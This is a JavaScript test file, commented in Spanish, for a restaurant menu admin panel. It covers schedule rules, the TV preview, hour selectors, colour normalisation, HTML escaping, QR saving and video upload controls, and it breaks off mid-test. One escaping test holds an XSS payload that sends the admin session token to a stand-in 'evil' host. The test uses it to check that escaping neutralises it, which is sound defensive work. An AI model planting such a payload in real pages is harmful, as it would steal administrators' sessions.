// Funciones que viven en el HTML del panel y en qr.js. No son módulos, así
// que se extraen del fuente y se evalúan: así se prueba el código que se
// despliega y no una copia que puede quedarse atrás.
const { test, describe } = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const path = require('path');
const vm = require('vm');

const PUBLIC = path.join(__dirname, '..', 'public');

// El panel era un solo index.html y desde el 15/09/2026 se está partiendo en
// archivos: panel.css, comun.js y uno por pestaña. Esto los junta todos, en el
// orden en que el navegador los pide —marcado, estilos y scripts—, para las
// pruebas que leen el código como texto.
//
// Las comprobaciones NEGATIVAS («nadie escribe var(--warning)») tienen que
// usar esto y no un archivo suelto: contra index.html solo, pasarían siempre en
// cuanto el código que vigilan se mudara a otro archivo, sin que nada avisara.
const codigoDelPanel = () => [
	'index.html', 'panel.css',
	...fs.readdirSync(PUBLIC).filter(a => a.endsWith('.js')).sort(),
].map(a => fs.readFileSync(path.join(PUBLIC, a), 'utf8')).join('\n');

// Extrae el trozo de fuente entre dos marcas y lo evalúa en un contexto con
// los stubs que necesite.
//
// 'desde' admite también una lista de pares [desde, hasta] cuando lo que se
// prueba se apoya en un ayudante que vive en otra parte del archivo. Se
// evalúan todos en el MISMO contexto, en el orden dado, porque si no la
// función bajo prueba llamaría a algo que no existe. Se prefiere esto a
// copiar el ayudante al test: una copia se queda atrás sin avisar y entonces
// la prueba pasa contra código que ya no se despliega.
//
// Un par puede llevar delante su propio archivo —['tv.js', 'const X', null]—
// para juntar en un mismo contexto trozos de varios archivos del panel, que en
// el navegador comparten las declaraciones de nivel superior.
function cargar(archivo, desde, hasta, contexto = {}) {
	const pares = Array.isArray(desde) ? desde : [[desde, hasta]];
	const ctx = vm.createContext(Array.isArray(desde) ? (hasta || {}) : contexto);

	for (const par of pares) {
		const [de, ini, fin] = par.length === 3 ? par : [archivo, ...par];
		const src = fs.readFileSync(path.join(PUBLIC, de), 'utf8');
		const i = src.indexOf(ini);
		assert.notEqual(i, -1, `no se encontró "${ini}" en ${de} — ¿se renombró?`);
		const f = fin ? src.indexOf(fin, i) : src.length;
		// Sin esto, una marca de fin que ya no está —porque su código se movió a
		// otro archivo— daba -1, y slice(i, -1) cargaba el archivo casi entero sin
		// avisar. Pasó a ser un riesgo real al partir index.html en archivos.
		assert.notEqual(f, -1, `no se encontró "${fin}" después de "${ini}" en ${de} — ¿se movió?`);
		vm.runInContext(src.slice(i, f), ctx);
	}
	return ctx;
}

// ═══════════════════════════════════════════════════════════════
describe('la programación · el mismo juego de casos que el menú y el televisor', () => {
	// La regla vive en TRES sitios y ninguno puede importar a los otros: el menú
	// (core/horarios.js), la cartelera (una copia en dialecto viejo dentro de
	// tv.html, porque un televisor de 2017 no entiende la sintaxis moderna) y
	// este espejo del panel, que es el que dice "ahora mismo sí está saliendo".
	//
	// Tres copias que discrepan solo se notan los martes, que es cuando peor se
	// encuentra el fallo. Este archivo —duplicado a propósito en los dos
	// repositorios— es lo único que impide que se separen.
	const CASOS = JSON.parse(
		fs.readFileSync(path.join(__dirname, 'casos-programacion.json'), 'utf8'));

	const regla = () => cargar('index.html',
		[['function zonaRestaurante', 'function describirHorario']],
		{ state: {}, Intl, Date, RegExp, String, Array, parseInt });

	for (const c of CASOS.casos) {
		test(c.nombre, () => {
			assert.equal(
				regla().vigenteAhora(c.programacion, CASOS.zona, new Date(c.momento)),
				c.esperado);
		});
	}

	test('el archivo de casos no se ha quedado vacío', () => {
		// Una lista vacía haría pasar todo lo de arriba sin probar nada.
		assert.ok(CASOS.casos.length >= 20, `solo hay ${CASOS.casos.length} casos`);
	});

	test('la zona se calcula de verdad, no se cae al reloj de la máquina', () => {
		// Se pregunta por MADRID a propósito. Con Bogotá, una máquina que ya está
		// en hora de Colombia da la respuesta correcta aunque el cálculo de zona
		// NO se esté ejecutando, y la prueba pasa en verde sin probar nada. Eso
		// ocurrió de verdad en el otro repositorio: verde en local, rojo en CI.
		const r = regla().ahoraEnZona('Europe/Madrid', new Date('2026-09-08T23:30:00-05:00'));
		assert.equal(r.dia, 3, 'en Madrid ya es miércoles');
		assert.equal(r.minutos, 6 * 60 + 30);
		assert.equal(r.fecha, '2026-09-09');
	});

	test('declarar algo no es estar vigente', () => {
		// Unos martes SÍ tienen programación un jueves, aunque ese jueves no
		// salgan. De esa diferencia depende la regla de dos niveles.
		const { tieneProgramacion } = regla();
		assert.equal(tieneProgramacion({}), false);
		assert.equal(tieneProgramacion({ activo: true }), false);
		assert.equal(tieneProgramacion({ activo: true, dias: [2] }), true);
		assert.equal(tieneProgramacion({ activo: true, desde_fecha: '2026-12-01' }), true);
		assert.equal(tieneProgramacion({ activo: false, dias: [2] }), false);
	});

	test('unos martes sin horas siguen siendo solo los martes', () => {
		// Antes esto devolvía true y se saltaba los días, así que habría salido
		// toda la semana. Comprobado que ninguna categoría en producción tenía
		// horario activo antes de cambiarlo.
		const { vigenteAhora } = regla();
		const soloDias = { activo: true, dias: [2] };
		assert.equal(vigenteAhora(soloDias, 'America/Bogota', new Date('2026-09-08T19:00:00-05:00')), true);
		assert.equal(vigenteAhora(soloDias, 'America/Bogota', new Date('2026-09-09T19:00:00-05:00')), false);
	});
});

describe('la vista previa de la cartelera', () => {
	// Es la cartelera de VERDAD embebida, no una imitación. Una imitación
	// tendría que reproducir el ciclo, las animaciones, la rotación de
	// intercalados y los colores, y el día que cualquiera de esas cosas
	// cambiara en tv.html mentiría sin que nadie lo notara.
	const montar = (orientacion = 'horizontal', enlace = 'https://menu.vmenus.co/bonzas/tv') => {
		const campos = {
			tvOrientacion: { value: orientacion },
			tvEnlace:      { value: enlace },
			tvPrevia:      { style: {}, src: '' },
			tvPreviaCaja:  { style: {} },
			tvPreviaMarco: { style: { display: 'none' } },
			btnVistaPrevia:   { textContent: '' },
			btnRecargarPrevia:{ style: {} },
		};
		const ctx = cargar('tv.js',
			[['const TV_ANCHO_PREVIA', 'async function saveTV']],
			{ document: { getElementById: id => campos[id] }, Math, Date, Number });
		return { ctx, campos };
	};

	test('apaisada usa las proporciones de un televisor', () => {
		const { ctx } = montar('horizontal');
		const m = ctx.tvMedidasDePrevia();
		assert.equal(m.w, 1280);
		assert.equal(m.h, 720);
	});

	test('vertical las invierte y se limita por altura', () => {
		// Con 560 de ancho, una vertical daría casi mil de alto y empujaría el
		// resto del formulario fuera de la pantalla.
		const { ctx } = montar('vertical');
		const m = ctx.tvMedidasDePrevia();
		assert.equal(m.w, 720);
		assert.equal(m.h, 1280);
		assert.ok(m.h * m.escala <= 420, 'no pasa de 420 px de alto');
	});

	test('la caja se queda con el tamaño ya encogido', () => {
		// El iframe sigue midiendo 720 px para el diseño aunque se vea a 315:
		// sin fijar la caja, quedaría un hueco enorme debajo.
		const { ctx, campos } = montar('horizontal');
		ctx.tvPintarMedidasDePrevia();
		assert.equal(campos.tvPrevia.style.width, '1280px');
		assert.equal(campos.tvPreviaCaja.style.height, '315px');
	});

	test('recargar fuerza una carga nueva, no repite el mismo src', () => {
		// Asignar el mismo valor a src no vuelve a pedir nada, y la vista previa
		// se quedaría con la configuración anterior justo después de guardar.
		const { ctx, campos } = montar();
		campos.tvPreviaMarco.style.display = 'block';
		ctx.tvRecargarVistaPrevia();
		assert.match(campos.tvPrevia.src, /^https:\/\/menu\.vmenus\.co\/bonzas\/tv\?v=\d+$/);
	});

	test('con la vista previa cerrada no se carga nada', () => {
		const { ctx, campos } = montar();
		ctx.tvRecargarVistaPrevia();
		assert.equal(campos.tvPrevia.src, '');
	});

	test('cerrarla VACÍA el iframe, no lo esconde', () => {
		// Escondido seguiría rotando, pidiendo fotos y sondeando Supabase cada
		// cinco minutos detrás de una pestaña que nadie mira.
		const { ctx, campos } = montar();
		ctx.tvAlternarVistaPrevia();                       // abrir
		assert.match(campos.tvPrevia.src, /menu\.vmenus\.co/);
		ctx.tvAlternarVistaPrevia();                       // cerrar
		assert.equal(campos.tvPrevia.src, 'about:blank');
		assert.equal(campos.tvPreviaMarco.style.display, 'none');
	});

	test('sin enlace todavía no intenta cargar', () => {
		const { ctx, campos } = montar('horizontal', '');
		campos.tvPreviaMarco.style.display = 'block';
		ctx.tvRecargarVistaPrevia();
		assert.equal(campos.tvPrevia.src, '');
	});
});

describe('el televisor solo se ofrece a quien puede tenerlo', () => {
	// perroscriollos no tiene cartelera —su plan no la incluye— y aun así la
	// tarjeta de promoción le ofrecía un interruptor «En el televisor». Un
	// control que promete algo que el plan no incluye confunde y no lleva a
	// ninguna parte. Es el mismo patrón que ya apareció con la pantalla de marca.
	const conPlan = (plan, atributos = {}) => cargar('index.html',
		[['const TODO_INCLUIDO', 'function planActual() {'],
		 	['function planActual() {', '// ── MODELOS QUE PINTAN VIDEO'],
		 	['function restauranteTieneTv', '// Qué modelo se guarda']],
		{ state: { restaurante: { atributos: { plan, ...atributos } } } });

	test('los dos planes la ofrecen, también a quien sigue guardado con un plan viejo', () => {
		// Hasta el 17/09/2026 «pedidos» no la tenía, ni un restaurante sin plan.
		// Ahora va incluida en todo.
		for (const p of ['fotos', 'video', 'pedidos', 'vitrina', undefined])
			assert.equal(conPlan(p).restauranteTieneTv(), true, String(p));
	});

	test('una cartelera ya configurada se ofrece siempre', () => {
		// Si algún día vuelve un plan sin TV, un cambio de plan no puede dejar una
		// pantalla encendida en la pared de un local sin forma de apagarla.
		assert.match(fs.readFileSync(path.join(PUBLIC, 'index.html'), 'utf8'),
			/function restauranteTieneTv\(\) \{\s*return !!planActual\(\)\.tv \|\| !!state\.restaurante\?\.atributos\?\.tv;/);
	});
});

describe('la hora de las promociones · selector y 24 horas', () => {
	// <input type="time"> no sirve para esto: el formato lo decide el sistema
	// operativo del visitante, no la página. Comprobado en navegador el
	// 05/09/2026 con lang="es-CO", "es-ES" y "en-GB" en el propio input — los
	// tres pintan "06:30 p. m.".
	//
	// Un <select> es a la vez selector (no hay que teclear) y 24 h en cualquier
	// aparato, porque las etiquetas las escribimos nosotros.
	const horas = () => cargar('index.html',
		[['const PASO_HORA', 'function abrirCalendarioAlPulsar']],
		{ document: domDeSelect(), Math, String, Array });

	function domDeSelect() {
		return {
			createElement: () => ({
				className: '', value: '', textContent: '', hijos: [],
				appendChild(h) { this.hijos.push(h); return h; },
			}),
		};
	}

	test('media hora de resolución, de 00:00 a 23:30', () => {
		const o = horas().opcionesDeHora();
		assert.equal(o.length, 48);
		assert.equal(o[0], '00:00');
		assert.equal(o[1], '00:30');
		assert.equal(o[o.length - 1], '23:30');
	});

	test('todas van en 24 h, sin a. m. ni p. m.', () => {
		// Es el punto entero del cambio: mucha gente duda si las doce del
		// mediodía son 12 a. m. o 12 p. m.
		const o = horas().opcionesDeHora();
		assert.ok(o.every(h => /^\d{2}:\d{2}$/.test(h)), 'formato HH:MM');
		assert.ok(o.includes('12:00'), 'el mediodía es 12:00');
		assert.ok(o.includes('00:00'), 'y la medianoche 00:00');
		assert.ok(o.includes('18:00'), 'las 6 de la tarde son 18:00');
	});

	test('la primera opción significa "todo el día"', () => {
		// Contesta en el propio control la duda de marcar días sin marcar horas.
		const sel = horas().selectorDeHora('p-desde', '');
		assert.equal(sel.hijos[0].value, '');
		assert.equal(sel.hijos[0].textContent, 'Todo el día');
	});

	test('una hora guardada fuera de la rejilla no desaparece', () => {
		// Si no estuviera, abrir la ficha y guardar sin tocar nada le cambiaría
		// el horario al restaurante sin que nadie lo pidiera.
		const sel = horas().selectorDeHora('p-desde', '18:45');
		assert.ok(sel.hijos.some(o => o.value === '18:45'), '18:45 sigue en la lista');
	});
});

describe('la nota del horario de categoría', () => {
	// El editor de categorías decía "completa las dos horas: vacías o iguales,
	// la categoría se verá siempre". Dejó de ser verdad al unificar la regla del
	// horario en tv.html y core/horarios.js: sin franja válida mandan los días
	// solos. La nota pedía rellenar algo que no hace falta y prometía un
	// comportamiento que ya no ocurre.
	const montar = (dias, desde, hasta) => {
		const campos = {
			editCatHorarioNota: { textContent: '', innerHTML: '', style: {} },
			editCatDesde: { value: desde },
			editCatHasta: { value: hasta },
		};
		const ctx = cargar('index.html', [
			// Hasta 'let catDiasSel' y no más allá: un 'let' dentro de un vm no se
			// puede pisar desde el contexto, así que si entrara aquí la prueba no
			// podría elegir los días.
			['const DIAS_CORTOS', 'let catDiasSel'],
			['function zonaRestaurante', 'function describirHorario'],
			['function describirHorario', 'function renderCatDiasChips'],
			['function renderCatHorarioNota', 'function cargarCatHorario'],
		], {
			document: { getElementById: id => campos[id] },
			state: {}, Intl, Date, RegExp, String, Array, parseInt, Set,
		});
		ctx.catDiasSel = new Set(dias);
		ctx.renderCatHorarioNota();
		return campos.editCatHorarioNota;
	};

	test('ya no pide rellenar horas que no hacen falta', () => {
		const nota = montar([1,3,5], '', '');
		assert.doesNotMatch(nota.innerHTML + nota.textContent, /Completa las dos horas/);
	});

	test('unos días sin horas se describen como el día entero', () => {
		const nota = montar([1,3,5], '', '');
		assert.match(nota.innerHTML, /L X V · todo el día/);
		assert.match(nota.innerHTML, /de una medianoche a la siguiente/);
	});

	test('con franja se describe la franja, sin esa coletilla', () => {
		const nota = montar([1,3,5], '11:00', '15:00');
		assert.match(nota.innerHTML, /11:00–15:00/);
		assert.doesNotMatch(nota.innerHTML, /de una medianoche a la siguiente/);
	});

	test('sin ningún día sí avisa, porque eso sí lo hace ver siempre', () => {
		const nota = montar([], '11:00', '15:00');
		assert.match(nota.textContent, /Elige al menos un día/);
	});

	test('la franja que cruza medianoche sigue explicándose', () => {
		const nota = montar([5], '18:00', '02:00');
		assert.match(nota.innerHTML, /cruza la medianoche/);
	});

	test('dice si ahora mismo se está viendo', () => {
		// Con los siete días y todo el día, la respuesta no depende de cuándo se
		// corra la prueba.
		const nota = montar([0,1,2,3,4,5,6], '', '');
		assert.match(nota.innerHTML, /Ahora mismo se está mostrando/);
	});
});

describe('describirHorario · unos días sin horas son el día entero', () => {
	// La duda que trajo el usuario: marcar lunes, miércoles y viernes sin poner
	// horas. Antes se leía "L X V · –", que no dice nada.
	const fn = () => cargar('index.html',
		[['function describirHorario', 'function renderCatDiasChips']],
		{ DIAS_CORTOS: ['D','L','M','X','J','V','S'], Array });

	test('sin franja lo dice con palabras', () => {
		assert.match(fn().describirHorario({ dias: [1,3,5] }), /L X V · todo el día/);
	});

	test('con franja la enseña', () => {
		assert.match(fn().describirHorario({ dias: [1,3,5], desde: '18:00', hasta: '23:00' }),
			/L X V · 18:00–23:00/);
	});

	test('sin días marcados son todos', () => {
		assert.match(fn().describirHorario({ desde: '18:00', hasta: '23:00' }),
			/Todos los días/);
	});
});

describe('programacionDelFormulario · lo que la tarjeta manda a guardar', () => {
	// La tarjeta de una promoción arma su programación desde sus propios campos.
	const caja = valores => ({
		querySelector: c => ({
			checked: valores[c.slice(1)] === true,
			value: typeof valores[c.slice(1)] === 'string' ? valores[c.slice(1)] : '',
		}),
	});
	const fn = () => cargar('promocion.js',
		[['function programacionDelFormulario', 'async function guardarPromo']], {});

	test('con el interruptor apagado no manda nada', () => {
		// Un objeto vacío es "de fondo, siempre vigente". Mandar días con el
		// interruptor apagado guardaría una programación que la tarjeta no enseña.
		const r = fn().programacionDelFormulario(caja({ 'p-prog': false }), new Set([2]));
		assert.deepEqual(Object.keys(r), []);
	});

	test('con el interruptor encendido manda las tres capas', () => {
		const r = fn().programacionDelFormulario(caja({
			'p-prog': true, 'p-desde': '18:00', 'p-hasta': '23:00',
			'p-desdef': '2026-12-01', 'p-hastaf': '2026-12-24',
		}), new Set([2, 5]));
		assert.equal(r.activo, true);
		assert.equal(r.dias.join(','), '2,5');
		assert.equal(r.desde, '18:00');
		assert.equal(r.hasta_fecha, '2026-12-24');
	});

	test('encendido y sin nada marcado se guarda como sin programación', () => {
		// Guardar 'activo:true' con todo vacío deja una fila que promete una
		// programación que no existe — y la regla de dos niveles la leería como
		// "programada", quitándole el turno a las de fondo sin motivo. Se
		// comporta igual (sale siempre), así que se guarda como tal.
		const ctx = cargar('index.html',
			[['promocion.js', 'function programacionDelFormulario', 'async function guardarPromo'],
			 ['function zonaRestaurante', 'function describirHorario']],
			{ state: {}, Intl, Date, RegExp, String, Array, parseInt });
		const r = ctx.programacionParaGuardar(caja({ 'p-prog': true }), new Set());
		assert.deepEqual(Object.keys(r), []);
	});

	test('pero con un solo día sí se guarda entera', () => {
		const ctx = cargar('index.html',
			[['promocion.js', 'function programacionDelFormulario', 'async function guardarPromo'],
			 ['function zonaRestaurante', 'function describirHorario']],
			{ state: {}, Intl, Date, RegExp, String, Array, parseInt });
		const r = ctx.programacionParaGuardar(caja({ 'p-prog': true }), new Set([2]));
		assert.equal(r.activo, true);
		assert.equal(r.dias.join(','), '2');
	});

	test('los días salen ordenados', () => {
		// Un Set no promete orden, y el orden acaba guardado en la base.
		const r = fn().programacionDelFormulario(caja({ 'p-prog': true }), new Set([5, 0, 2]));
		assert.equal(r.dias.join(','), '0,2,5');
	});
});

describe('hex6 · normaliza colores para el selector nativo', () => {
	const { hex6 } = cargar('index.html', 'function hex6', '// El cuadrito y el campo');

	test('expande los hex de tres dígitos', () => {
		// <input type="color"> solo admite #rrggbb: un #abc lo dejaría en
		// negro y el cuadrito no coincidiría con lo escrito.
		assert.equal(hex6('#abc'), '#aabbcc');
		assert.equal(hex6('#AABBCC'), '#aabbcc');
	});

	test('acepta las formas razonables de escribir un color', () => {
		assert.equal(hex6('#ffd521'), '#ffd521');
		assert.equal(hex6('ffd521'), '#ffd521', 'sin almohadilla');
		assert.equal(hex6('  #ffd521  '), '#ffd521', 'con espacios');
	});

	test('lo inválido conserva el valor anterior, no salta a negro', () => {
		// Si saltara a negro, el diseño se movería solo mientras alguien
		// termina de teclear el color.
		for (const malo of ['#12345', 'rojo', '', null, undefined, '#zzzzzz'])
			assert.equal(hex6(malo, '#e91e63'), '#e91e63', `con ${JSON.stringify(malo)}`);
	});

	test('los colores que la plataforma usa hoy pasan intactos', () => {
		for (const c of ['#ffd521', '#f5a623', '#cdfefe', '#a374af', '#3d568c',
		                 '#3dd68c', '#12111a', '#1a1825', '#0a0a0f', '#000000', '#ffffff'])
			assert.equal(hex6(c), c);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('esc · escapado en el panel', () => {
	const { esc } = cargar('comun.js', 'function esc(s)', '// ── SESIÓN Y ESTADO');

	test('el nombre de un producto no puede inyectar código', () => {
		// Importa más que en el menú público: el superadmin abre el panel de
		// CUALQUIER restaurante y su sesión vive en sessionStorage.
		const payload = '<img src=x onerror="fetch(\'//evil/\'+sessionStorage.menuAdminToken)">';
		const salida = esc(payload);
		assert.ok(!/<[a-zA-Z]/.test(salida), 'no debe quedar ninguna etiqueta');
		assert.ok(!salida.includes('"'), 'no debe quedar comilla que abra un atributo');
	});

	test('un nombre normal se muestra igual', () => {
		assert.equal(esc('HAMBURGUESA'), 'HAMBURGUESA');
		assert.equal(esc("PA' QUE NO JODA"), 'PA&#39; QUE NO JODA');
	});

	test('nulo no imprime la palabra "null"', () => {
		assert.equal(esc(null), '');
		assert.equal(esc(undefined), '');
	});
});

// ═══════════════════════════════════════════════════════════════
describe('qrGuardarDiseno · guardar el QR no puede pisar el resto', () => {
	// 'atributos' es un solo JSON compartido por siete pantallas que no se
	// conocen entre sí. El 27/08/2026 se cambiaron las cinco de index.html
	// para que cada una mandara SOLO sus claves y las fundiera el servidor,
	// que sí tiene la versión de ahora. Esta se quedó fuera por vivir en otro
	// archivo, y siguió mandando el objeto entero desde la copia que el panel
	// cargó al entrar.
	//
	// El caso concreto: el superadmin abre el diseñador de QR a las 10:00, el
	// dueño cambia su WhatsApp de pedidos a las 10:05, el superadmin guarda el
	// QR a las 10:10 — y el WhatsApp vuelve al de las 10:00.
	const guardar = async () => {
		const enviado = [];
		const ctx = cargar('qr.js', 'async function qrGuardarDiseno', null, {
			qrCfg: { fg: '#000000', punto: 'redondo' },
			qrLeerControles: () => {},
			fijarFotoDePestana: () => {},
			document: { getElementById: () => ({ textContent: '', style: {} }) },
			showToast: () => {},
			state: {
				restaurante: {
					id: 'r1',
					// Lo que el panel cargó al entrar y ya está viejo.
					atributos: { whatsapp_pedidos: '573001112233', nav: 'carrito', qr: { fg: '#ffffff' } },
				},
			},
			apiFetch: async (metodo, ruta, cuerpo) => { enviado.push({ metodo, ruta, cuerpo }); return { id: 'r1' }; },
		});
		await ctx.qrGuardarDiseno();
		return enviado[0];
	};

	test('manda SOLO la clave qr', async () => {
		const { cuerpo } = await guardar();
		assert.deepEqual(Object.keys(cuerpo.atributos), ['qr'],
			'cualquier otra clave arrastra un valor viejo encima del de ahora');
	});

	test('no reenvía el WhatsApp de pedidos que cargó al entrar', async () => {
		// La clave concreta que más duele: es a dónde llega el dinero.
		const { cuerpo } = await guardar();
		assert.equal(cuerpo.atributos.whatsapp_pedidos, undefined);
		assert.equal(cuerpo.atributos.nav, undefined);
	});

	test('el diseño sí viaja entero', async () => {
		const { cuerpo, metodo } = await guardar();
		assert.equal(metodo, 'PATCH');
		assert.equal(cuerpo.atributos.qr.punto, 'redondo', 'lo que se acaba de elegir');
	});
});

// ═══════════════════════════════════════════════════════════════
describe('Diseñador de QR · avisos de escaneabilidad', () => {
	// qrRevisarAvisos y qrLeerControles leen del DOM; se les da uno falso.
	function preparar(cfgPrevia, entradas) {
		const campos = {
			qrColorFg:   { value: entradas.fg ?? '#000000' },
			qrColorOjos: { value: entradas.ojos ?? '' },
			qrColorBg:   { value: entradas.bg ?? '#ffffff' },
			qrCartelBg:  { value: '#111111' },
			qrCartelFg:  { value: '#ffffff' },
			qrTransparente: { checked: false },
			qrUsarLogo:  { checked: false },
			qrLogoTam:   { value: '22' },
			qrMargen:    { value: String(entradas.margen ?? 4) },
			qrCartelTitulo: { value: '' },
			qrCartelPie: { value: '' },
			qrAviso:     { textContent: '', style: {} },
		};
		const ctx = cargar('qr.js', 'const QR_HEX_RE', 'function qrElegirEstilo', {
			qrCfg: { ...cfgPrevia },
			document: { getElementById: id => campos[id] || null },
		});
		ctx.qrLeerControles();
		ctx.qrRevisarAvisos();
		return { aviso: campos.qrAviso.textContent, cfg: ctx.qrCfg };
	}

	test('un color mal escrito avisa y conserva el anterior', () => {
		// Canvas ignora en silencio un fillStyle inválido y se queda con el
		// del fondo: el QR salía en blanco sin que nada lo dijera.
		const { aviso, cfg } = preparar({ fg: '#e91e63', bg: '#ffffff' }, { fg: '#12345' });
		assert.match(aviso, /Color no válido/);
		assert.equal(cfg.fg, '#e91e63', 'no se pierde el color que ya funcionaba');
	});

	test('nombra los campos concretos que están mal', () => {
		const { aviso } = preparar({ fg: '#000000', bg: '#ffffff' }, { fg: 'rojo', bg: 'blanco' });
		assert.match(aviso, /los puntos y el fondo/);
	});

	test('los formatos válidos no se marcan como inválidos', () => {
		// Ojo: #abc es #aabbcc, un azul claro que sobre blanco sí dispara el
		// aviso de contraste. Eso es correcto; aquí solo interesa que no se
		// le acuse de estar mal escrito.
		for (const [entradas, etiqueta] of [
			[{ fg: '#abc' }, 'hex de 3 dígitos'],
			[{ fg: '#AABBCC' }, 'mayúsculas'],
			[{ ojos: '' }, 'esquinas vacío = igual que los puntos'],
			[{ fg: '#000000' }, 'hex completo'],
		]) assert.doesNotMatch(preparar({}, entradas).aviso, /Color no válido/, etiqueta);
	});

	test('un margen por debajo de la norma avisa', () => {
		// La norma del QR pide 4 módulos de zona de silencio; con menos,
		// muchos lectores fallan impreso junto a otros elementos.
		assert.match(preparar({}, { margen: 0 }).aviso, /Margen de 0 módulos/);
		assert.match(preparar({}, { margen: 1 }).aviso, /Margen de 1 módulo\b/, 'singular');
		assert.doesNotMatch(preparar({}, { margen: 4 }).aviso, /Margen/);
		assert.doesNotMatch(preparar({}, { margen: 8 }).aviso, /Margen/);
	});

	test('el aviso de contraste sigue funcionando', () => {
		assert.match(preparar({}, { fg: '#ffffff', bg: '#000000' }).aviso, /claro sobre fondo oscuro/);
		assert.match(preparar({}, { fg: '#777777', bg: '#888888' }).aviso, /poco contraste/);
		assert.equal(preparar({}, { fg: '#000000', bg: '#ffffff', margen: 4 }).aviso, '', 'negro sobre blanco, sin avisos');
	});

	test('varios problemas se listan juntos, no se pisan', () => {
		const { aviso } = preparar({ fg: '#000000' }, { fg: '###', margen: 0 });
		assert.ok(aviso.split('\n').length >= 2, 'debe verlos todos de una vez');
	});
});

// ═══════════════════════════════════════════════════════════════
describe('pintarVideoPlato · la subida de video depende del plan', () => {
	// Esconder el grupo no es la seguridad —esa vive en POST /api/video—,
	// pero sí es lo que evita ofrecerle a un restaurante algo que no ha
	// contratado y que la API le va a rechazar.
	const pantalla = () => {
		const ids = ['videoGroup', 'videoEditPreview', 'videoEditVacio',
			'btnSubirVideo', 'btnQuitarVideo', 'videoUploadStatus', 'videoFileInput',
			'videoDesdeFila', 'btnConfirmarVideo', 'videoDesde', 'videoDesdeAviso',
				'videoFallido', 'videoFallidoMotivo',
				// El bloque de revisión de lo que generó el modelo.
				'iaRevision', 'iaRevisionVideo', 'iaRevisionEstado',
				'btnPublicarIA', 'btnDescartarIA',
				// El aviso de "este video quedó en el formato anterior".
				'videoDesfasado', 'videoDesfasadoTexto', 'videoDesfasadoEstado', 'btnReconvertir',
				// La vuelta de un video retirado.
				'videoRetirado', 'videoRetiradoEstado', 'btnRecuperarVideo'];
		const mapa = {};
		for (const id of ids) mapa[id] = {
			style: {}, textContent: '', value: '', disabled: false,
			removeAttribute(n) { delete this[n === 'poster' ? 'poster' : 'src']; },
			load() {},
		};
		return mapa;
	};

	const pintar = (videos, plato, mapa, trabajos = [], porAprobar = [], nav = 'video') => {
		// Dos trozos, en este orden: videoDesfasadoDe() pregunta por
		// formatoDeLaCarta(), que vive arriba con el resto de lo que sabe de
		// modelos. Se carga el ayudante de verdad en vez de un doble para que
		// esta prueba siga midiendo la regla que se despliega.
		const ctx = cargar('index.html', [
			['function formatoDeLaCarta', 'function idPlanActual'],
			['// Los trabajos de conversión del restaurante.', '// Elegir el archivo ya no lo sube'],
		], {
				clearInterval() {},
				planActual: () => ({ videos }),
				state: { trabajosVideo: trabajos, videosPorAprobar: porAprobar,
				         restaurante: { atributos: { nav } } },
				document: { getElementById: id => mapa[id] },
			});
		ctx.pintarVideoPlato(plato);
		return mapa;
	};

	test('un plan sin video no enseña la subida', () => {
		const m = pintar(false, { id: 'p1' }, pantalla());
		assert.equal(m.videoGroup.style.display, 'none');
	});

	test('el plan de video sí la enseña', () => {
		const m = pintar(true, { id: 'p1' }, pantalla());
		assert.equal(m.videoGroup.style.display, 'block');
	});

	test('un plato sin guardar no puede recibir video todavía', () => {
		// El video se cuelga de un producto_id que aún no existe. Dejar el
		// botón vivo mandaría la subida a un 400 sin explicar por qué.
		const m = pintar(true, null, pantalla());
		assert.equal(m.btnSubirVideo.disabled, true);
		assert.match(m.videoEditVacio.textContent, /Guarda el plato primero/);
	});

	test('un plato con video ya convertido lo muestra', () => {
		const url = 'https://ejemplo.test/uploads/videos/a.mp4';
		const m = pintar(true, { id: 'p1', atributos: { video: { url } } }, pantalla());
		assert.equal(m.videoEditPreview.src, url);
		assert.equal(m.videoEditPreview.style.display, 'block');
		assert.equal(m.videoEditVacio.style.display, 'none');
	});

	// ── QUITAR SOLO SE OFRECE CUANDO HAY ALGO QUE QUITAR ──────
	// Es la mitad visible de una acción que hasta ahora no existía: 'video' lo
	// escribe la cola y atributosProducto() lo conserva siempre, así que un
	// plato con video no podía perderlo por ninguna vía del panel.
	//
	// El botón se ata al video YA PUESTO, no a haber elegido un archivo:
	// mientras se elige o se convierte, lo que se necesita es cancelar, y eso
	// es otra cosa que retirar lo que la carta ya está enseñando.

	test('sin video no se ofrece quitarlo', () => {
		const m = pintar(true, { id: 'p1' }, pantalla());
		assert.equal(m.btnQuitarVideo.style.display, 'none');
	});

	test('con video puesto sí', () => {
		const m = pintar(true, { id: 'p1', atributos: { video: { url: 'https://ejemplo.test/uploads/videos/a.mp4' } } }, pantalla());
		assert.equal(m.btnQuitarVideo.style.display, 'block');
	});

	test('un plato sin guardar tampoco lo ofrece', () => {
		// No tiene id, así que no hay a qué ruta llamar.
		const m = pintar(true, null, pantalla());
		assert.equal(m.btnQuitarVideo.style.display, 'none');
	});

	// ── ABRIR OTRO PLATO DESHACE "HAY UN ARCHIVO A MEDIAS" ────
	// prepararVideoElegido pinta el botón de subir como principal y renombra
	// el de elegir a "Cambiar archivo". Sin deshacerlo, abrir otro plato
	// dejaba esa pinta sobre una ficha donde no hay nada que cambiar ni que
	// subir — y el botón principal, que es el que más llama, apuntando a nada.

	test('el botón de subir vuelve a su aspecto de reposo', () => {
		const m = pantalla();
		m.btnConfirmarVideo.style.background = 'var(--success)';
		pintar(true, { id: 'p1' }, m);

		assert.equal(m.btnConfirmarVideo.style.display, 'none');
		assert.equal(m.btnConfirmarVideo.style.background, 'transparent');
	});

	test('y el de elegir recupera su nombre', () => {
		const m = pantalla();
		m.btnSubirVideo.textContent = '🎬 Cambiar archivo';
		pintar(true, { id: 'p1' }, m);

		assert.match(m.btnSubirVideo.textContent, /Elegir video/);
	});

	// ── UN VIDEO RETIRADO TIENE QUE PODER VOLVER ──────────────
	// El aviso al quitar promete que el original se conserva y se puede volver
	// a poner. Eso era cierto en el servidor —la fila y el master siguen ahí—
	// y falso en el panel: el único botón que reconvierte colgaba del bloque
	// "formato anterior", que solo se pinta CUANDO HAY VIDEO. Al quitarlo
	// desaparecía, y la vuelta prometida no existía por ninguna parte.
	//
	// Se probó a mano y salió: por eso estas pruebas, que es lo que faltaba
	// para que no vuelva a salir.

	test('sin video pero con master, se ofrece volver a ponerlo', () => {
		const m = pintar(true, { id: 'p1' }, pantalla(), listo('horizontal'));
		assert.equal(m.videoRetirado.style.display, 'block');
	});

	test('con el video puesto NO se ofrece: no hay nada que recuperar', () => {
